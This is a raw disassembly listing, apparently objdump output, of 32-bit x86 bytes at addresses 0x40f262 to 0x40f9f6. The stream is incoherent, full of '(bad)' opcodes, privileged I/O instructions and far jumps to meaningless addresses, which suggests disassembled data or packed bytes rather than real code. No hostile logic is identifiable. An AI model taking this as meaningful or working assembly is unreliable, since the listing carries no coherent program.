  40f262:	xchg   al,dh
  40f264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f265:	dec    ebp
  40f266:	ins    DWORD PTR es:[edi],dx
  40f267:	or     al,0x9b
  40f269:	mov    bh,0x14
  40f26b:	pop    ecx
  40f26c:	xchg   ebp,eax
  40f26d:	inc    esp
  40f26e:	int    0xc6
  40f270:	imul   ebp,DWORD PTR [edi],0x61
  40f273:	pop    esp
  40f274:	xor    eax,0xcc4782da
  40f279:	and    eax,0x2733f693
  40f27e:	xor    eax,0xbfa49ac2
  40f283:	aaa    
  40f284:	das    
  40f285:	adc    eax,0x37b55bd
  40f28a:	jp     0x40f29f
  40f28c:	int    0x59
  40f28e:	jae    0x40f23b
  40f290:	jmp    0x811ad193
  40f295:	repnz xchg edi,eax
  40f297:	jne    0x40f226
  40f299:	(bad)  
  40f29a:	je     0x40f264
  40f29c:	lds    esi,FWORD PTR [ebx+0x1b075a8a]
  40f2a2:	xor    dl,BYTE PTR [eax]
  40f2a4:	cmp    ecx,eax
  40f2a6:	aam    0x68
  40f2a8:	inc    esp
  40f2a9:	outs   dx,BYTE PTR ds:[esi]
  40f2aa:	fs (bad) 
  40f2ac:	fiadd  DWORD PTR [ebp+0x5f94f187]
  40f2b2:	mov    ecx,0x165e44b0
  40f2b7:	(bad)  
  40f2b8:	in     eax,dx
  40f2b9:	in     al,0x5c
  40f2bb:	sbb    al,0xa1
  40f2bd:	fild   QWORD PTR [ebp+edx*8+0x60337849]
  40f2c4:	dec    esp
  40f2c5:	icebp  
  40f2c6:	sar    DWORD PTR [edi],0xb0
  40f2c9:	stos   BYTE PTR es:[edi],al
  40f2ca:	ds daa 
  40f2cc:	ror    BYTE PTR [edi-0x6e],1
  40f2cf:	stc    
  40f2d0:	mov    ah,0xa2
  40f2d2:	stc    
  40f2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2d4:	retf   
  40f2d5:	mov    eax,0x44ee5e11
  40f2da:	jmp    0x266a123a
  40f2df:	xchg   DWORD PTR [ecx],edi
  40f2e1:	sub    BYTE PTR cs:0x3d6d47b7,cl
  40f2e8:	sub    al,0x38
  40f2ea:	mov    ch,BYTE PTR [ebx]
  40f2ec:	into   
  40f2ed:	pop    edi
  40f2ee:	adc    al,0x6a
  40f2f0:	adc    ebp,0xffffffcd
  40f2f3:	sbb    al,0xaf
  40f2f5:	mov    ebp,0x5b1d6a94
  40f2fa:	sub    eax,0xffffffdd
  40f2fd:	fisttp QWORD PTR ds:0x30f2216b
  40f303:	or     BYTE PTR [ebx-0x8b3d04b],bh
  40f309:	cwde   
  40f30a:	jo     0x40f342
  40f30c:	data16 out 0x1,al
  40f30f:	fiadd  DWORD PTR [eax+esi*8+0x26]
  40f313:	cdq    
  40f314:	pop    esi
  40f315:	adc    BYTE PTR [ebx+ebp*4+0x8aa1780],ch
  40f31c:	aam    0x8c
  40f31e:	(bad)  
  40f31f:	int    0xb7
  40f321:	ret    
  40f322:	into   
  40f323:	xchg   esi,eax
  40f324:	mov    edx,0x24d5848b
  40f329:	pop    ebp
  40f32a:	jne    0x40f2ba
  40f32c:	xchg   edx,eax
  40f32d:	jo     0x40f30f
  40f32f:	stc    
  40f330:	and    al,0xb
  40f332:	mov    al,ds:0x2f44418
  40f337:	test   BYTE PTR [edx+edx*8+0x0],bh
  40f33b:	icebp  
  40f33c:	imul   eax,DWORD PTR [edx],0xa2667256
  40f342:	ror    edx,1
  40f344:	dec    edx
  40f345:	sub    BYTE PTR [eax],ah
  40f347:	sbb    esp,esp
  40f349:	(bad)  [edx-0x50771a4b]
  40f34f:	add    esp,esi
  40f351:	cli    
  40f352:	adc    DWORD PTR [esi-0x46],ebp
  40f355:	push   ebp
  40f356:	mov    esp,0x4274469f
  40f35b:	jns    0x40f33c
  40f35d:	out    0xea,ax
  40f360:	enter  0x31fa,0x26
  40f364:	aaa    
  40f365:	ins    BYTE PTR es:[edi],dx
  40f366:	es cmp al,0x96
  40f369:	mov    ebp,0x38eaba0a
  40f36e:	fistp  QWORD PTR [esi-0x2788cf32]
  40f374:	xchg   edx,eax
  40f375:	loop   0x40f3bd
  40f377:	sbb    ebp,DWORD PTR [esi+esi*8+0x71]
  40f37b:	inc    edi
  40f37c:	je     0x40f315
  40f37e:	xor    bh,bl
  40f380:	jns    0x40f3d4
  40f382:	(bad)  
  40f384:	lock sbb edi,0x49
  40f388:	sahf   
  40f389:	add    edx,DWORD PTR [ebx*8+0x1f46c573]
  40f390:	pop    es
  40f391:	pop    ebx
  40f392:	push   ss
  40f393:	push   eax
  40f394:	inc    ebx
  40f395:	repz lock rol DWORD PTR [ebp+0x1933aca9],cl
  40f39d:	ret    0x5b65
  40f3a0:	ja     0x40f406
  40f3a2:	mov    dh,0x2
  40f3a4:	repnz mov cs,WORD PTR [ebp+0x29]
  40f3a8:	dec    ebp
  40f3a9:	jne    0x40f33e
  40f3ab:	retf   
  40f3ac:	sti    
  40f3ad:	sub    BYTE PTR [edi-0x2b],cl
  40f3b0:	inc    ecx
  40f3b1:	in     eax,0xe5
  40f3b3:	pop    esp
  40f3b4:	sub    eax,0x7aa4c461
  40f3b9:	or     ch,BYTE PTR [ecx+0x2e]
  40f3bc:	ins    BYTE PTR es:[edi],dx
  40f3bd:	mov    ds:0x4d1bdaf4,eax
  40f3c2:	sbb    BYTE PTR [edi-0x38],al
  40f3c5:	jno    0x40f3ed
  40f3c7:	or     DWORD PTR [edx+0x7fe6b953],ebp
  40f3cd:	xchg   DWORD PTR [esi-0x22],edx
  40f3d0:	popa   
  40f3d1:	sub    eax,0xf9ec9e53
  40f3d6:	icebp  
  40f3d7:	mov    DWORD PTR [eax],ebp
  40f3d9:	jno    0x40f382
  40f3db:	inc    ebx
  40f3dc:	xchg   esp,eax
  40f3dd:	dec    edx
  40f3de:	add    dl,bh
  40f3e0:	or     DWORD PTR [edx+edi*2+0x77],0x20
  40f3e5:	dec    BYTE PTR [esi-0xc272238]
  40f3eb:	inc    edx
  40f3ec:	xlat   BYTE PTR ds:[ebx]
  40f3ed:	pop    ds
  40f3ee:	mov    BYTE PTR [ecx],dl
  40f3f0:	jg     0x40f45c
  40f3f2:	int    0xae
  40f3f4:	fdiv   QWORD PTR [bx+si-0x613]
  40f3f9:	pop    esp
  40f3fa:	(bad)  
  40f3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3fc:	mov    WORD PTR [ebx+0x3e],cs
  40f3ff:	aad    0x3b
  40f401:	push   eax
  40f402:	inc    edx
  40f403:	popf   
  40f404:	sbb    esi,DWORD PTR [edx+ecx*2-0xd]
  40f408:	push   0x17
  40f40a:	cmp    DWORD PTR [edi+0x66],ebp
  40f40d:	(bad)  
  40f40e:	leave  
  40f40f:	sar    BYTE PTR [ebx],1
  40f411:	into   
  40f412:	sub    dh,BYTE PTR [eax]
  40f414:	(bad)  
  40f415:	push   ss
  40f416:	idiv   BYTE PTR [edx]
  40f418:	enter  0x9ffb,0x30
  40f41c:	ret    0x532d
  40f41f:	pusha  
  40f420:	mov    BYTE PTR [ebx+0x764325ba],bh
  40f426:	adc    ebp,DWORD PTR [esi]
  40f428:	fs into 
  40f42a:	rcr    DWORD PTR [esi-0x2c3d4262],0xe
  40f431:	data16 adc BYTE PTR [ecx-0x3ee182c9],dh
  40f438:	div    BYTE PTR ds:0x71a4d0e0
  40f43e:	out    dx,al
  40f43f:	push   eax
  40f440:	push   es
  40f441:	add    BYTE PTR ds:0xa88843be,dl
  40f447:	dec    esp
  40f448:	push   eax
  40f449:	mov    dl,0x3c
  40f44b:	or     DWORD PTR [edi+0x6d569f87],esi
  40f451:	fsub   DWORD PTR [ebx]
  40f453:	fist   WORD PTR [edx-0x6]
  40f456:	adc    eax,0x2555e66b
  40f45b:	in     eax,dx
  40f45c:	test   al,0x2f
  40f45e:	add    edi,DWORD PTR [edx]
  40f460:	xchg   ecx,eax
  40f461:	mov    eax,0x77a3eec3
  40f466:	shr    DWORD PTR [edx-0x7a152670],1
  40f46c:	fcomp  QWORD PTR [ecx]
  40f46e:	xchg   ebx,eax
  40f46f:	inc    edi
  40f470:	xchg   edi,eax
  40f471:	xor    edi,DWORD PTR [edx+0x6f05af24]
  40f477:	pop    esp
  40f478:	adc    bh,dl
  40f47a:	ins    DWORD PTR es:[edi],dx
  40f47b:	aad    0xd3
  40f47d:	fisub  DWORD PTR [esp+edi*4-0x61120f35]
  40f484:	int3   
  40f485:	or     al,BYTE PTR [ecx+0x7a]
  40f488:	push   cs
  40f489:	add    al,0xb2
  40f48b:	mov    esp,0xcc40d197
  40f490:	jnp    0x40f436
  40f492:	ins    DWORD PTR es:[edi],dx
  40f493:	mov    edi,0x358b128b
  40f498:	rcr    BYTE PTR [edx+eax*2],cl
  40f49b:	add    BYTE PTR [ecx],al
  40f49d:	xor    cl,BYTE PTR [ebx+0x158b0875]
  40f4a3:	rcr    BYTE PTR [edx+eax*2],cl
  40f4a6:	add    BYTE PTR [ecx+0x510893f6],al
  40f4ac:	pop    es
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	rcr    bh,1
  40f4c6:	cmp    BYTE PTR [esi],bh
  40f4c8:	dec    ebx
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x43]
  40f4d1:	lods   al,BYTE PTR ds:[esi]
  40f4d2:	test   DWORD PTR [edx+0x3b],eax
  40f4d5:	dec    esp
  40f4d6:	adc    al,BYTE PTR [ecx-0x254cd4c]
  40f4dc:	and    BYTE PTR [esi+0x738e890f],bh
  40f4e2:	into   
  40f4e3:	ror    DWORD PTR [ebx],1
  40f4e5:	mov    bh,0xd5
  40f4e7:	or     DWORD PTR [esi],eax
  40f4e9:	(bad)  [ebx+0x15deef89]
  40f4ef:	xchg   edx,eax
  40f4f0:	push   0x5d08142e
  40f4f5:	ror    DWORD PTR [edi+esi*2+0x4ad04528],1
  40f4fc:	lahf   
  40f4fd:	and    DWORD PTR [eax-0x28ad5528],0xa3141fca
  40f507:	scas   eax,DWORD PTR es:[edi]
  40f508:	dec    ebp
  40f509:	jns    0x40f4ea
  40f50b:	cli    
  40f50c:	out    0x88,eax
  40f50e:	scas   eax,DWORD PTR es:[edi]
  40f50f:	mov    cl,0x25
  40f511:	xlat   BYTE PTR ds:[ebx]
  40f512:	popa   
  40f513:	imul   BYTE PTR [ebp+0x2fad99ee]
  40f519:	jb     0x40f4cd
  40f51b:	cld    
  40f51c:	out    dx,al
  40f51d:	test   bh,0x51
  40f520:	loopne 0x40f519
  40f522:	and    BYTE PTR [esi+ebp*8],dl
  40f525:	(bad)  
  40f526:	lahf   
  40f527:	and    DWORD PTR [ecx+eiz*1],ebx
  40f52a:	out    0x2f,eax
  40f52c:	add    eax,0xe259236c
  40f531:	mov    eax,ds:0x96e8e152
  40f536:	and    esi,ebx
  40f538:	push   ecx
  40f539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f53a:	popa   
  40f53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f53c:	or     eax,0x636c05dc
  40f541:	imul   esi,DWORD PTR [ecx-0xfac2cfe],0xbea98184
  40f54b:	inc    ecx
  40f54c:	fstp   QWORD PTR [ebp+0x462eadf4]
  40f552:	sti    
  40f553:	outs   dx,BYTE PTR ds:[esi]
  40f554:	push   ebp
  40f555:	sti    
  40f556:	adc    al,0x50
  40f558:	mov    ch,al
  40f55a:	das    
  40f55b:	push   ebx
  40f55c:	xchg   bl,ah
  40f55e:	int    0x6e
  40f560:	pop    ebp
  40f561:	jmp    0xc3f6eea1
  40f566:	inc    ecx
  40f567:	imul   ebp,DWORD PTR [ebx],0x0
  40f56a:	mov    edx,0xcc8d4d3
  40f56f:	add    ah,BYTE PTR [eax]
  40f571:	jo     0x40f5ce
  40f573:	mov    BYTE PTR [eax],cl
  40f575:	retf   0x740a
  40f578:	mov    ebx,0x51807d0f
  40f57e:	cmp    BYTE PTR [edx+0x4b4e114f],dl
  40f584:	popa   
  40f585:	call   0x309f:0xcb487805
  40f58c:	test   BYTE PTR [edi-0x981b00b],dl
  40f592:	and    ebx,ebx
  40f594:	dec    ebx
  40f595:	imul   eax,edi,0x636012d8
  40f59b:	pop    esi
  40f59c:	push   ebx
  40f59d:	mov    ?,ecx
  40f59f:	pop    ebx
  40f5a0:	inc    edx
  40f5a1:	pop    ds
  40f5a2:	push   eax
  40f5a3:	sti    
  40f5a4:	aad    0x8b
  40f5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a7:	cmp    BYTE PTR [ecx+0x1aeacf94],bh
  40f5ad:	call   0xbff0a901
  40f5b2:	adc    BYTE PTR [ecx],dl
  40f5b4:	retf   
  40f5b5:	fwait
  40f5b6:	mov    esp,0xd490e8d3
  40f5bb:	mov    eax,DWORD PTR [ebp+0x30]
  40f5be:	imul   edx,DWORD PTR [edx-0x7f],0x1cefc2b9
  40f5c5:	xchg   esi,eax
  40f5c6:	add    DWORD PTR [ebx+0x8e835cd],eax
  40f5cc:	jg     0x40f570
  40f5ce:	xor    bl,al
  40f5d0:	mov    al,ds:0x7b40e829
  40f5d6:	aad    0xb2
  40f5d8:	push   esi
  40f5d9:	gs cmp al,0xe8
  40f5dc:	jnp    0x40f591
  40f5de:	cld    
  40f5df:	jmp    0x21cf11f2
  40f5e4:	inc    ebp
  40f5e5:	mov    cl,0x72
  40f5e7:	sbb    esi,DWORD PTR [edi-0x80]
  40f5ea:	mov    cl,bh
  40f5ec:	test   BYTE PTR [eax-0x2],bl
  40f5ef:	push   edx
  40f5f0:	sub    DWORD PTR [edi],0xcf9514c7
  40f5f6:	dec    ebx
  40f5f7:	call   0xb70b:0x4a001e06
  40f5fe:	pop    ebp
  40f5ff:	pop    ebp
  40f600:	scas   al,BYTE PTR es:[edi]
  40f601:	scas   al,BYTE PTR es:[edi]
  40f602:	into   
  40f603:	(bad)  
  40f604:	sbb    esi,eax
  40f606:	enter  0x134f,0x44
  40f60a:	hlt    
  40f60b:	and    eax,0xb668b936
  40f610:	bound  edi,QWORD PTR [esi]
  40f612:	inc    DWORD PTR [ecx+0x6a]
  40f615:	jbe    0x40f654
  40f617:	mov    ds:0x452764a0,al
  40f61c:	mov    dl,0x51
  40f61e:	mov    cl,0x82
  40f620:	popf   
  40f621:	(bad)  
  40f622:	dec    edx
  40f623:	(bad)  
  40f625:	pusha  
  40f626:	pop    edi
  40f627:	ins    BYTE PTR es:[edi],dx
  40f628:	mov    bh,0x64
  40f62a:	adc    bh,ch
  40f62c:	xor    bh,BYTE PTR [edx]
  40f62e:	jge    0x40f64e
  40f630:	(bad)  
  40f631:	in     al,dx
  40f632:	pop    ebp
  40f633:	sbb    BYTE PTR [esi-0x3],ah
  40f636:	sub    eax,0xbb0e7540
  40f63b:	sub    dh,bl
  40f63d:	rcr    DWORD PTR [ebx-0x6424c6c6],1
  40f643:	clc    
  40f644:	or     ch,BYTE PTR fs:[edx+0x623de775]
  40f64b:	pop    edx
  40f64c:	pop    ds
  40f64d:	pop    eax
  40f64e:	ins    BYTE PTR es:[edi],dx
  40f64f:	and    dl,BYTE PTR [edx+0x2a2ecbcf]
  40f655:	mov    ds,WORD PTR [edi+0x6a20e426]
  40f65b:	fimul  WORD PTR [edx+esi*2+0x34f6ca2d]
  40f662:	(bad)  
  40f664:	jmp    0x40f637
  40f666:	imul   eax,DWORD PTR ds:0x4abaa551,0x79
  40f66d:	mov    al,ds:0xec3cdc35
  40f672:	(bad)  
  40f674:	jmp    0x40f612
  40f676:	xchg   edx,eax
  40f677:	inc    ecx
  40f678:	mov    esi,gs
  40f67a:	(bad)  
  40f67b:	cmp    al,0x7d
  40f67d:	mov    eax,0xe5148dca
  40f682:	inc    edx
  40f684:	sub    esp,ecx
  40f686:	cmp    edx,eax
  40f688:	outs   dx,BYTE PTR ds:[esi]
  40f689:	psubsw mm3,QWORD PTR [ebx-0x4f929bc8]
  40f690:	add    al,0xf8
  40f692:	dec    ebx
  40f693:	mov    eax,0xbfb04271
  40f698:	xchg   ebx,eax
  40f699:	push   0x2f328751
  40f69e:	sbb    edx,DWORD PTR [eax+0x985d45f]
  40f6a4:	(bad)  
  40f6a6:	push   edx
  40f6a7:	xchg   edx,eax
  40f6a8:	jg     0x40f648
  40f6aa:	out    0x77,al
  40f6ac:	jmp    0x5565:0xd4ffbd80
  40f6b3:	pusha  
  40f6b4:	loope  0x40f6e0
  40f6b6:	add    DWORD PTR [ebx-0x77],ecx
  40f6b9:	jle    0x40f710
  40f6bb:	and    DWORD PTR [eax+0x66],edx
  40f6be:	sub    ah,BYTE PTR [edx-0x54e4f8ee]
  40f6c4:	pop    edi
  40f6c5:	inc    eax
  40f6c6:	leave  
  40f6c7:	jae    0x40f6b3
  40f6c9:	mov    edi,DWORD PTR [eax+0x48]
  40f6cc:	push   esi
  40f6cd:	jmp    0x5011:0x890ee3eb
  40f6d4:	les    ebx,FWORD PTR [eax+ebp*4+0x77]
  40f6d8:	shl    BYTE PTR [edi-0x3e8814d5],cl
  40f6de:	cmp    esp,ebx
  40f6e0:	fdivr  st(1),st
  40f6e2:	add    ah,dh
  40f6e4:	sbb    cl,BYTE PTR [ecx]
  40f6e6:	jle    0x40f745
  40f6e8:	xchg   ebp,eax
  40f6e9:	xor    al,0x60
  40f6eb:	xor    al,0x82
  40f6ed:	jbe    0x40f688
  40f6ef:	xchg   ebx,eax
  40f6f0:	jecxz  0x40f75e
  40f6f2:	sub    al,0xf0
  40f6f4:	sbb    edi,esp
  40f6f6:	scas   al,BYTE PTR es:[edi]
  40f6f7:	shl    DWORD PTR [ecx],cl
  40f6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6fa:	jge    0x40f6a0
  40f6fc:	inc    edi
  40f6fd:	loop   0x40f735
  40f6ff:	fmul   st,st(7)
  40f701:	adc    DWORD PTR [eax-0x543efe1d],0xa
  40f708:	cmc    
  40f709:	stos   DWORD PTR es:[edi],eax
  40f70a:	out    dx,al
  40f70b:	jb     0x40f699
  40f70d:	test   dh,bl
  40f70f:	xchg   esp,eax
  40f711:	add    DWORD PTR [esi+0x23],esi
  40f714:	ss pop es
  40f716:	scas   eax,DWORD PTR es:[edi]
  40f717:	inc    ebx
  40f718:	push   es
  40f719:	clc    
  40f71a:	cmp    ah,ah
  40f71c:	std    
  40f71d:	movhlps xmm2,xmm7
  40f720:	les    ecx,FWORD PTR [esi-0x77b710c0]
  40f726:	inc    eax
  40f727:	shr    dh,0xc0
  40f72a:	cld    
  40f72b:	mov    WORD PTR [ecx+0x7fa3b856],?
  40f731:	pop    esp
  40f732:	push   ebx
  40f733:	push   eax
  40f734:	rol    esi,cl
  40f736:	scas   eax,DWORD PTR es:[edi]
  40f737:	cmp    DWORD PTR [ebp-0x24],ebp
  40f73a:	test   DWORD PTR [edi],ecx
  40f73c:	push   edi
  40f73d:	lock adc eax,0x42adf0d0
  40f743:	push   es
  40f744:	aaa    
  40f745:	popa   
  40f746:	call   0xaf1740f5
  40f74b:	xchg   cl,bl
  40f74d:	xchg   esp,eax
  40f74e:	ficom  WORD PTR [ecx+eiz*1-0x43849221]
  40f755:	or     bh,BYTE PTR [esi-0x65]
  40f758:	ds sahf 
  40f75a:	repz out dx,eax
  40f75c:	mov    BYTE PTR [edi-0x7e778a27],dh
  40f762:	pop    eax
  40f763:	push   ecx
  40f764:	cmc    
  40f765:	push   0xffffffb6
  40f767:	xor    eax,0xcff367ab
  40f76c:	imul   BYTE PTR [esi]
  40f76e:	jns    0x40f79a
  40f770:	dec    ebp
  40f771:	and    ch,0x3f
  40f774:	lahf   
  40f775:	leave  
  40f776:	shl    ecx,0x46
  40f779:	cmp    BYTE PTR [ebx+0x472d9a41],bh
  40f77f:	je     0x40f78f
  40f781:	pop    DWORD PTR [eax-0x2b11d276]
  40f787:	gs nop
  40f789:	ins    DWORD PTR es:[edi],dx
  40f78a:	fidiv  DWORD PTR [esi+0x7a]
  40f78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f78e:	cwde   
  40f78f:	sub    ecx,DWORD PTR [esi]
  40f791:	iret   
  40f792:	mov    edx,0x4d495116
  40f797:	das    
  40f798:	xchg   ebx,eax
  40f799:	in     eax,dx
  40f79a:	mov    ch,0x7f
  40f79c:	add    ebp,ebp
  40f79e:	and    al,0x5d
  40f7a0:	scas   eax,DWORD PTR es:[edi]
  40f7a1:	sub    dh,BYTE PTR [edi-0x73]
  40f7a4:	retf   0x905e
  40f7a7:	pop    ecx
  40f7a8:	dec    edx
  40f7a9:	cmp    DWORD PTR [ecx+eiz*1],eax
  40f7ac:	scas   al,BYTE PTR es:[edi]
  40f7ad:	push   0xf84539a0
  40f7b2:	into   
  40f7b3:	cmp    bl,BYTE PTR [edx]
  40f7b5:	bound  ecx,QWORD PTR [edx+0x74]
  40f7b8:	and    al,0x47
  40f7ba:	mov    edx,0x5643465a
  40f7bf:	shl    BYTE PTR [ecx+0x669f6d4d],0x9d
  40f7c6:	mov    edx,0x323c0d79
  40f7cb:	ret    0x4757
  40f7ce:	or     dl,BYTE PTR [edi+esi*4+0x5a3a248f]
  40f7d5:	mov    ds:0xccdd483d,eax
  40f7da:	fisubr DWORD PTR [edx-0x12f7e8d2]
  40f7e0:	fist   WORD PTR [edx]
  40f7e2:	inc    esp
  40f7e3:	call   0xea84:0x9c64812a
  40f7ea:	mov    ebp,0xae914d61
  40f7ef:	fwait
  40f7f0:	inc    ebx
  40f7f2:	cmovg  eax,DWORD PTR [ebx]
  40f7f5:	jmp    0xfc6b7ff6
  40f7fa:	inc    esi
  40f7fb:	aam    0xbf
  40f7fd:	loope  0x40f805
  40f7ff:	in     al,0x95
  40f801:	stos   DWORD PTR es:[edi],eax
  40f802:	push   ebx
  40f803:	shl    BYTE PTR [ecx],0xb4
  40f806:	jge    0x40f7ce
  40f808:	sbb    eax,0x1fc11256
  40f80d:	fsub   DWORD PTR [esi]
  40f80f:	sbb    bl,BYTE PTR [ebx+0x2462e13f]
  40f815:	popa   
  40f816:	push   0xffffffe4
  40f818:	jae    0x40f7d7
  40f81a:	push   ebx
  40f81b:	inc    edx
  40f81c:	sub    DWORD PTR [esi-0x4],edi
  40f81f:	push   cs
  40f820:	scas   eax,DWORD PTR es:[edi]
  40f821:	fidiv  DWORD PTR [esi-0x3d]
  40f824:	es je  0x40f7c5
  40f827:	dec    ebx
  40f828:	out    0xb2,eax
  40f82a:	ficomp DWORD PTR [edi+0x29071f9e]
  40f830:	and    ch,bh
  40f832:	test   dl,ah
  40f834:	inc    esi
  40f835:	ficomp DWORD PTR [bp+si+0x4619]
  40f83a:	mov    bh,0x4e
  40f83c:	or     bh,BYTE PTR [eax]
  40f83e:	add    DWORD PTR gs:[ecx+0x79],ebx
  40f842:	or     BYTE PTR [ebp+0x20065f9f],cl
  40f848:	out    0xb4,al
  40f84a:	adc    bl,BYTE PTR [edx-0x28c72d78]
  40f850:	test   BYTE PTR [ecx-0x1d38360c],al
  40f856:	daa    
  40f857:	(bad)  
  40f859:	cmp    al,0x91
  40f85b:	test   eax,0xde7841c8
  40f860:	das    
  40f861:	sbb    bh,BYTE PTR [eax+0x6f]
  40f864:	inc    ecx
  40f865:	jnp    0x40f7f4
  40f867:	jmp    0x40f8c5
  40f869:	push   0xf335874e
  40f86e:	int    0x4d
  40f870:	xor    edx,edx
  40f872:	aaa    
  40f873:	sbb    dh,BYTE PTR [edi+0x62e10a1d]
  40f879:	dec    edx
  40f87a:	adc    al,0xc5
  40f87c:	ficom  DWORD PTR [esi+0x13eabe6e]
  40f882:	cld    
  40f883:	add    bh,bl
  40f885:	mov    DWORD PTR [esi+eiz*8-0x90dfbe4],eax
  40f88c:	xchg   dl,dh
  40f88e:	sub    esp,ecx
  40f890:	std    
  40f891:	push   0x3f
  40f893:	cmp    eax,0x76a088b2
  40f898:	test   al,0x63
  40f89a:	push   cs
  40f89b:	retf   0x5716
  40f89e:	daa    
  40f89f:	or     eax,0xdf2c28ff
  40f8a4:	outs   dx,DWORD PTR ds:[esi]
  40f8a5:	xlat   BYTE PTR ds:[ebx]
  40f8a6:	mov    al,ds:0x62566e1d
  40f8ab:	pushf  
  40f8ac:	sub    ebx,esi
  40f8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8af:	jmp    0x29ed:0xa87dee6e
  40f8b6:	fnstcw WORD PTR [eax]
  40f8b8:	jo     0x40f883
  40f8ba:	mov    esp,0x9f802421
  40f8bf:	jl     0x40f8b5
  40f8c1:	sub    eax,DWORD PTR [esp+edi*2-0x1]
  40f8c5:	xor    eax,0x75affee
  40f8ca:	sbb    dh,0x19
  40f8cd:	or     bl,BYTE PTR [edx-0x6]
  40f8d0:	scas   eax,DWORD PTR es:[edi]
  40f8d1:	sbb    DWORD PTR [ebx],0x7a
  40f8d4:	imul   edi,DWORD PTR [edi+0x1d],0x38
  40f8d8:	mov    eax,0x3d1640f5
  40f8dd:	mov    al,0x13
  40f8df:	repz or eax,0x1426310e
  40f8e5:	(bad)  
  40f8e6:	(bad)  
  40f8e7:	outs   dx,BYTE PTR ds:[esi]
  40f8e8:	inc    ecx
  40f8e9:	hlt    
  40f8ea:	(bad)  
  40f8eb:	mov    ebx,fs
  40f8ed:	or     BYTE PTR [ecx-0x5f2318c8],0x81
  40f8f4:	in     al,dx
  40f8f5:	dec    ecx
  40f8f6:	mov    DWORD PTR ds:0xe6399d32,eax
  40f8fc:	in     al,dx
  40f8fd:	sbb    eax,0x92b41fc
  40f902:	dec    ebp
  40f903:	xchg   ebx,ebp
  40f905:	mov    al,0xd6
  40f907:	gs push ecx
  40f909:	stos   DWORD PTR es:[edi],eax
  40f90a:	sti    
  40f90b:	xchg   ebx,eax
  40f90c:	clc    
  40f90d:	pop    ss
  40f90e:	jno    0x40f8cb
  40f910:	jmp    0x21a0fab2
  40f915:	push   es
  40f916:	push   eax
  40f917:	pop    ecx
  40f918:	inc    esp
  40f919:	sbb    bl,bl
  40f91b:	sub    esi,eax
  40f91d:	sar    DWORD PTR [ebp+0x47],cl
  40f920:	fld    QWORD PTR [edx]
  40f922:	rcr    DWORD PTR [ecx+0x17b6120d],1
  40f928:	ret    
  40f929:	xchg   DWORD PTR [ebx],esi
  40f92b:	inc    ebx
  40f92c:	fadd   DWORD PTR [edx-0x58]
  40f92f:	idiv   DWORD PTR [ebx-0x18734bc]
  40f935:	imul   ecx,ebx,0x48
  40f938:	clc    
  40f939:	sti    
  40f93a:	add    DWORD PTR [ebx],ebp
  40f93c:	push   edi
  40f93d:	enter  0xf74f,0x51
  40f941:	aam    0xbf
  40f943:	jo     0x40f8ff
  40f945:	mov    esi,0x193a7fc7
  40f94a:	daa    
  40f94b:	jnp    0x40f905
  40f94d:	jbe    0x40f8de
  40f94f:	jns    0x40f949
  40f951:	out    0x73,al
  40f953:	popf   
  40f954:	cmp    ebp,DWORD PTR [eax+0xd2a22ce]
  40f95a:	fimul  WORD PTR [edi]
  40f95c:	mov    ds:0xd6b5d025,al
  40f961:	cdq    
  40f962:	sbb    BYTE PTR [ebx+eiz*1],0x40
  40f966:	cdq    
  40f967:	popa   
  40f968:	sub    DWORD PTR [ebp+ebx*1+0x43a2fa1e],edx
  40f96f:	lods   al,BYTE PTR ds:[esi]
  40f970:	lock (bad) 
  40f972:	jmp    0x908e5ec1
  40f977:	repz les esp,FWORD PTR [ebx-0x4b32645b]
  40f97e:	sbb    dl,BYTE PTR ds:[ebx]
  40f981:	or     BYTE PTR [edi+0x25bdd906],cl
  40f987:	pop    edx
  40f988:	dec    ebx
  40f989:	sbb    DWORD PTR [edi+0xc],esi
  40f98c:	add    al,0x10
  40f98f:	test   DWORD PTR [ecx-0x3f],eax
  40f992:	mov    eax,ds:0xc8fc3f75
  40f997:	inc    edx
  40f998:	imul   ebp,esp,0x6acb8201
  40f99e:	out    0x4d,al
  40f9a0:	xchg   ecx,eax
  40f9a1:	lods   eax,DWORD PTR ds:[esi]
  40f9a2:	retf   
  40f9a3:	icebp  
  40f9a4:	rcr    BYTE PTR [ebp-0x51],0x9c
  40f9a8:	ins    DWORD PTR es:[edi],dx
  40f9a9:	inc    ecx
  40f9aa:	xchg   DWORD PTR [ecx-0x38],edi
  40f9ad:	sub    eax,0x2e83a555
  40f9b2:	adc    bh,dl
  40f9b4:	adc    edx,DWORD PTR [edi-0x6d]
  40f9b7:	mov    cl,0x4b
  40f9b9:	fwait
  40f9ba:	pop    edx
  40f9bb:	inc    edx
  40f9bc:	retf   
  40f9bd:	mov    ecx,0x68ab0c88
  40f9c2:	aas    
  40f9c3:	lea    edi,[esi]
  40f9c5:	adc    eax,0x8f6fb1cc
  40f9ca:	bound  ebx,QWORD PTR [ecx]
  40f9cc:	sbb    edx,DWORD PTR [eax+ebx*4+0x21d0f835]
  40f9d3:	adc    BYTE PTR ds:0xa57fa4c4,ah
  40f9d9:	mov    al,ds:0xa27eaa78
  40f9de:	adc    bl,al
  40f9e0:	fld    DWORD PTR [ecx+0x2c3447cd]
  40f9e6:	mov    ebx,0xfc016969
  40f9eb:	or     esi,DWORD PTR [edi+0x20]
  40f9ee:	mul    BYTE PTR [edx+0x6b]
  40f9f1:	das    
  40f9f2:	or     ch,cl
  40f9f4:	dec    esi
  40f9f5:	in     al,dx
  40f9f6:	pusha  
